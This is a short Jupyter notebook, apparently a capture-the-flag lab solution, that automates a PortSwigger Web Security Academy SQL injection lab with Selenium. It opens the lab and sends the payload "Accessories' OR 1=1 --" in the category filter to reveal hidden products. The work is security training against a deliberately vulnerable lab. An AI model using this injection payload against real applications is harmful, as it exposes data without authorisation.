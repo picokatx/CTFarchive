{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ok so reminder, I installed\n",
    "- selenium: firefox \n",
    "- selenium-wire: can actually modify requests and stuff\n",
    "- selenium-stealth: make headers look legit. oh this only supports chome. ok uninstall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "from webdriver_manager.firefox import GeckoDriverManager, DriverManager\n",
    "from selenium.webdriver.common.by import By\n",
    "from urllib.parse import urljoin, urlparse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "service = Service(executable_path=GeckoDriverManager().install())\n",
    "driver = webdriver.Firefox(service=service)\n",
    "driver.get(\"https://portswigger.net/users\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.get(\"https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'https://0aaf008403867a98800f447d00fb00d9.web-security-academy.net/'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "LAB_URL_FULL = driver.find_element(By.LINK_TEXT, \"ACCESS THE LAB\").get_attribute(\"href\")\n",
    "driver.get(LAB_URL_FULL)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "PAYLOAD = \"Accessories' OR 1=1 --\"\n",
    "driver.get(urljoin(driver.current_url, f\"/filter?category={PAYLOAD}\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.quit()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
